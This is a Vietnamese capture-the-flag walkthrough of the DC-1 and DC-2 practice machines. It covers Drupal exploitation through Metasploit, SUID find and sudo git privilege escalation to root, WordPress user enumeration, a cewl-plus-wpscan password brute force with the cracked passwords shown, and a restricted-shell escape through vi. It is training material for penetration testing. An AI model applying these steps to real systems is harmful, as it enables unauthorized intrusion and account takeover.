# DC 1

```bash
arp-scan -l
```

![alt text](IMG/DC-1/image.png)

```bash
nmap -p- -sV 172.16.1.129
```

![alt text](IMG/DC-1/image-1.png)

![alt text](IMG/DC-1/image-8.png)

```bash
gobuster dir -u http://172.16.1.129 -w /usr/share/wordlists/dirb/common.txt
```

![alt text](IMG/DC-1/image-5.png)

```bash
nikto -h http://172.16.1.129
```

```bash
searchsploit drupal
```

![alt text](IMG/DC-1/image-7.png)

```bash
msfconsole
```

![alt text](IMG/DC-1/image-9.png)

```bash
msf6 > search drupal
```

![alt text](IMG/DC-1/image-10.png)

```
set rhosts 172.16.1.129
run
```

![alt text](IMG/DC-1/image-11.png)

```bash
ls
cat flag1.txt
```

![alt text](IMG/DC-1/image-12.png)

```bash
cd /home
ls
```

![alt text](IMG/DC-1/image-13.png)

```bash
cd flag4
ls
cat flag4.txt
```

![alt text](IMG/DC-1/image-14.png)

```bash
cat /etc/passwd
```

![alt text](IMG/DC-1/image-15.png)

```bash
shell
/bin/bash -i
# hoặc 
# python -c 'import pty; pty.spawn("/bin/sh")'
# /bin/bash -i
```

Tham khảo [shell](https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell).

![alt text](IMG/DC-1/image-16.png)

```bash
ls
sudo -l
```

![alt text](IMG/DC-1/image-17.png)

Không có sudo.

```bash
cd /tmp
ls
ls -all
```

![alt text](IMG/DC-1/image-19.png)

Tiếp theo chúng ta sử dụng `LinEnum` để kiểm kê toàn bộ máy Linux sau khi đã có foothold, nhằm tìm cách privilege escalation. Tham khảo tại [đây](https://github.com/rebootuser/LinEnum)

Mở một tab khác của kali:

```bash
cd /home/kali/Downloads
wget https://raw.githubusercontent.com/rebootuser/LinEnum/refs/heads/master/LinEnum.sh
python -m http.server
```

![alt text](IMG/DC-1/image-21.png)

Quay lại meterprefer:

```bash
cd /tmp
wget http://172.16.1.128:8000/LinEnum.sh
```

![alt text](IMG/DC-1/image-20.png)

```bash
ls -l
```

![alt text](IMG/DC-1/image-22.png)

```bash
chmod +x 
ls -l
```

![alt text](IMG/DC-1/image-23.png)

```bash
./LinEnum.sh
```

![alt text](IMG/DC-1/image-24.png)

Sau Khi quét xong ta thấy có nhiều thư mục và các thông tin hữu ích như vị trí và nội dung có thể truy cập hay là các thư mục mail:

![alt text](IMG/DC-1/image-25.png)

Trong rất nhiều thông tin ta tìm được một thông tin hữu ích như sau:

![alt text](IMG/DC-1/image-26.png)

`find` bình thường là lệnh dùng để tìm file trên Linux. Nhưng ở đây điều đáng chú ý không phải là tên file, mà là quyền của nó.

```txt
- rw s r-x r-x
| |   |   |
| |   |   └── quyền của others
| |   └────── quyền của group
| └────────── quyền của owner
└──────────── loại file
```

`rwx` = owner có read/write/execute.

`rws` = owner có read/write/execute và có SUID.

`SUID` = Set User ID, tức là khi một file thực thi có bit SUID bật, lúc user thường chạy file đó, tiến trình được tạo ra sẽ chạy với effective UID của owner file, không phải UID của người chạy.

Trong TH này file thuộc `root` -> file có `SUID` -> nên khi ai đó chạy `/usr/bin/find`, tiến trình find có thể chạy với quyền hiệu lực của `root`.

Tham khảo câu lệnh Linux tại [đây](https://gtfobins.org/).

Như vậy thì find có quyền root nên ta sẽ thực hiện câu lệnh mở shell và lúc này shell sẽ có quyền root.

```bash
whoami
find . -exec /bin/sh \; -quit
whoami
```

![alt text](IMG/DC-1/image-27.png)

```bash
cd /root
cat thefinalflag.txt
```

![alt text](IMG/DC-1/image-29.png)

# DC-2

```bash
sudo nmap -T4 -sS -e eth0 172.16.1.0/24
```

![alt text](IMG/DC-2/image.png)

```bash
nmap -p- -sV 172.16.1.130
```

![alt text](IMG/DC-2/image-15.png)

Ở đây ta thấy có mở dịch vụ ssh trên port 7744, khá lạ vì bình thường là port 22.

Ta truy cập vào website: `172.16.1.130`.

![alt text](IMG/DC-2/image-1.png)

```bash
wget 172.16.1.130
```

![alt text](IMG/DC-2/image-2.png)

Như vậy tức là đang bị lỗi phân giải tên miền DC-2 sang địa chỉ IP tương ứng.

```bash
sudo nano /etc/hosts
# thêm 172.16.1.130 dc-2
```

![alt text](IMG/DC-2/image-3.png)

```bash
wget 172.16.1.130
```

![alt text](IMG/DC-2/image-4.png)

Như vậy chúng ta bây giờ đã có thể kết nối tới trang web.

![alt text](IMG/DC-2/image-5.png)

Từ thông tin trên hình ta xác định được đây là một giao diện `WordPress 4.7.10` mặc định và ta thấy có một mục `Flag`.

![alt text](IMG/DC-2/image-6.png)

Như vậy ta có gợi ý đầu tiên khi thực hiện tiếp lab này. Đây là một dấu hiện cho việc chúng ta cần phải thực hiện một cuộc tấn công mật khẩu. Chúng ta cần một danh sách tên người dùng và mật khẩu để thực hiện cuộc tấn công này.

Thêm `wp-admin` vào cuối URL sẽ đưa chúng ta đến với trang đăng nhập quản trị.

![alt text](IMG/DC-2/image-7.png)

Khi ta nhấn vào `Lost your password?` chúng ta sẽ được đưa đến một trang để chúng ta lấy lại mật khẩu bằng việc gửi qua email của tài khoản, nếu tài khoản tồn tại thì sẽ có thông báo gửi, còn không thì thông báo lỗi như hình bền dưới.

![alt text](IMG/DC-2/image-9.png)

![alt text](IMG/DC-2/image-8.png)

Nhưng việc thử như này sẽ mất khá nhiều thời gian nên ta sẽ thử theo cách khác bằng việc sử dụng công cụ `wpscan`.

```bash
wpscan --url http://dc-2 -evt evp -eu
```

- `--url http://dc-2`: chỉ định mục tiêu cần quét.

- `-evt evp`: `-e` = enumerate; `vt` = vulnerable themes; `vp` = vulnerable plugins -> Kiểm tra plugin/theme có lỗ hổng.

- `-eu`: --enumerate u -> Liệt kê, dò tìm các user của WordPress.

```txt
┌──(root㉿kali)-[/home/kali]
└─# wpscan --url http://dc-2 -evt evp -eu
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://dc-2/ [172.16.1.130]
[+] Started: Sun Apr  5 01:03:06 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.10 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://dc-2/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).
 | Found By: Rss Generator (Passive Detection)
 |  - http://dc-2/index.php/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>
 |  - http://dc-2/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://dc-2/wp-content/themes/twentyseventeen/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 4.0
 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: 'Version: 1.2'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==========================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] jerry
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Apr  5 01:03:10 2026
[+] Requests Done: 58
[+] Cached Requests: 6
[+] Data Sent: 14.614 KB
[+] Data Received: 514.805 KB
[+] Memory used: 185.809 MB
[+] Elapsed time: 00:00:03
```

![alt text](IMG/DC-2/image-10.png)

Sau khi quét xong ta thấy được 3 user là: `admin`, `tom` và `jerry`.

`Flag` ở trên gợi ý cho chúng ta sử dụng `cewl`. Cewl là một chương trình thu thập thông tin từ một URL và tạo các danh sách từ tùy chỉnh dựa trên những gì nó tìm thấy.

```bash
cewl http://dc-2
```

![alt text](IMG/DC-2/image-11.png)

Như vậy `cewl` sẽ cung cấp cho chúng ta một danh sách dài, ta sẽ lưu lại các kết quả này cho cuộc tấn công mật khẩu tiếp theo.

```bash
cewl http://dc-2 > /usr/share/wordlists/cewlpasswd.txt
```

Bây giờ ta sẽ thực hiện cuộc tấn công mật khẩu sử dựng wpscan với các tham số danh sách mật khẩu ta vừa lưu lại và danh sách tên người dùng chúng ta quét được.

```bash
wpscan --url http://dc-2 --passwords /usr/share/wordlists/cewlpasswd.txt --usernames tom,jerry,admin
```

Quá trình này sẽ mất một số thời gian nhất định, nhưng chúng ta thu được kết quả như sau:

![alt text](IMG/DC-2/image-12.png)

```txt
| Username: jerry, Password: adipiscing
| Username: tom, Password: parturient
```

Bây giờ ta thử đăng nhập vào cả 2 user trên. Trong use `tom` không có gì nhưng mà ở user `jerry` ta có thấy `flag2`.

![alt text](IMG/DC-2/image-13.png)

![alt text](IMG/DC-2/image-14.png)

`Flag2` gợi ý cho chúng ta nên tìm cách xâm nhập khác nếu không thể khai thác lỗ hổng `WordPress`. Vậy bây giờ ta sẽ thử sử dụng `SSH`.

![alt text](IMG/DC-2/image-16.png)

Ta thấy `jerry` không ssh được, ta chuyển sang `tom`.

```bash
ssh -p 7744 tom@172.16.1.130
```

![alt text](IMG/DC-2/image-17.png)

Ta thử tìm xung quanh thì thấy có `flag3.txt` nhưng mà chúng ta không thể đọc được nội dung của `flag3.txt`. Có vẻ như `Tom` ở trong một vỏ bọc bị hạn chế.

![alt text](IMG/DC-2/image-18.png)

Chúng ta ngồi tìm hiểu hệ thống một chúng

```bash
ls
ls /
ls /home
```

![alt text](IMG/DC-2/image-19.png)

Như vậy ở đây chúng ta có `tom` và `jerry`.

```bash
ls /home/tom
ls /home/jerry
```

![alt text](IMG/DC-2/image-20.png)

Như vậy chúng ta sẽ tìm hiểu về `tom` trước.

```bash
ls /home/tom
ls /home/tom/usr
ls /home/tom/usr/bin
```

![alt text](IMG/DC-2/image-21.png)

Như vậy chúng ta có tận 4 câu lệnh sử dụng được ở trên user `tom` là: `less`, `ls`, `scp`, `vi`.

Như vậy ta sử dụng `vi` để đọc được file `flag3.txt`.

```bash
vi flag3.txt
```

![alt text](IMG/DC-2/image-22.png)

Theo như gợi ý ở đây ngay bây giờ thì chúng ta cần phải chuyển người dùng sang `jerry`. Nhưng trước tiên chúng ta phải thoát khỏi shell bị hạn chế này.

```bash
less /etc/passwd
```

```bash
vi
```

Khi bạn gõ `vi` thì sẽ có dấu `:` ở dưới, nó hoạt động gần giống như lệnh `more` nơi bạn có thể nhập các lệnh `bash`. Ta sẽ sử dụng lệnh này để thiết lập `shell` thành `/bin/bash`

```bash
Ctrl ;
set shell=/bin/bash
Enter
Ctrl ;
!/bin/sh
Enter
```

![alt text](IMG/DC-2/image-23.png)

Như vậy bây giờ chúng ta đang ở trong một shell khác. Ta thử gọi cho jerry nhưng mà không được:

```bash
su jerry
```

![alt text](IMG/DC-2/image-24.png)

có thể su có nhưng mà nó không nằm trong đường dẫn PATH nên không tìm thấy được, chúng ta bây giờ hãy xem thử giá trị cua `PATH`.

```bash
echo $PATH
```

![alt text](IMG/DC-2/image-26.png)

```bash
export PATH=/bin:/usr/bin:$PATH
```

Sau khi export xong thì ta đã sử dụng được lệnh su để sang user `jerry`.

![alt text](IMG/DC-2/image-25.png)

Như vậy thông qua đây chúng ta biết rằng chúng ta đang ở trong hệ thống của jerry, mật khẩu đã đúng nhưng có vẻ như jerry không có quyền truy cập SSH bị hạn chế. Nhưng mà chúng ta cứ đọc file flag4.txt ở jerry trước đã.

```bash
cd /home/jerry
cat flag4.txt
```

![alt text](IMG/DC-2/image-27.png)

Để xem jerry có thể sử dụng những lệnh nào có quyền `root`, chúng ta sử dung `sudo -l`.

```bash
sudo -l
```

![alt text](IMG/DC-2/image-28.png)

Như vậy chúng ta thấy ở đây thì jerry có lệnh git quyền root mà không cần mật khẩu, khớp với sự gợi ý từ `flag4.txt`.

Bây giờ ta sẽ xem các tùy chọn của lệnh `git`, ta sẽ thêm sudo vào để chạy dưới quyền root, do không cần mật khẩu nên chúng ta có thể khai thác.

```bash
sudo git --help
```

![alt text](IMG/DC-2/image-29.png)

Ta thấy lệnh `git` cũng có phân trang giống như lệnh `vi`, bây giờ ta chi cần sử dụng tùy chọn phân sang rùi thực hiện gọi shell trên đó như lệnh vi ta đã làm trước đó.

```bash
sudo git -p --help
```

![alt text](IMG/DC-2/image-30.png)

Như vậy chúng có hoạt động và bây giờ ta chỉ cần xem chúng ta là ai bằng lệnh `whoami`:

![alt text](IMG/DC-2/image-31.png)